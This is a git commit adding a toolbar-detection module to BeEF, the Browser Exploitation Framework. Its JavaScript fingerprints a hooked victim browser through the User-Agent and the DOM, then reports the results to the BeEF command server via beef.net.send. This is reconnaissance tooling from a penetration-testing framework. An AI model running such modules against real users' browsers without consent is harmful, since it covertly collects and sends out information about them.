daadf597828e163d68e9f1621084e5c8fe146220
gcatt <giov.catt@gmail.com>
2013-01-31 09:20:32 +0100

    Module: Detect Toolbars
    Added a module to detect browser toolbars by checking the User-Agent
    and the DOM

---
+++ modules/browser/detect_toolbars/command.js
@@ -0,0 +1,61 @@
+//
+// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+beef.execute(function() {
+	
+	var toolbar_ua = new Array (
+		new Array (" Alexa Toolbar", " Alexa"),
+		new Array (" AskTbS-PV", " Ask"),
+		new Array (" BRI", " Bing"),
+		new Array (" GTB", " Google"),
+		new Array (" SU ", " Stumble Upon")
+		)
+		
+	var toolbar_id = new Array (
+		new Array ("AlexaCustomScriptId", " Alexa")
+		)	
+
+	var result = '';
+	var separator = ", ";
+    
+	// CHECK USER-AGENT
+	for (var i = 0; i < toolbar_ua.length; i++) {
+		
+		var agentRegex = new RegExp( toolbar_ua[i][0], 'g' );
+		
+		if ( agentRegex.exec(navigator.userAgent) ) {
+			
+			result += toolbar_ua[i][1] + separator;			
+			
+		}
+	}
+	
+	// CHECK ELEMENT ID (DOM)
+	for (var i = 0; i < toolbar_id.length; i++) {
+		
+		var element =  document.getElementById( toolbar_id[i][0] );
+		
+		if ( typeof(element) != 'undefined' && element != null ) {
+			
+			result += toolbar_id[i][1] + separator;
+			
+		}
+	}
+
+	// ENDING
+	if ( result != '' ) {
+		
+		result = result.slice(0, -separator.length);
+		
+	} else if ( result == '' ) {
+		
+		result = " no toolbars detected";
+		
+	}
+	
+	beef.net.send("<%= @command_url %>", <%= @command_id %>, "toolbars="+result);	
+	
+});
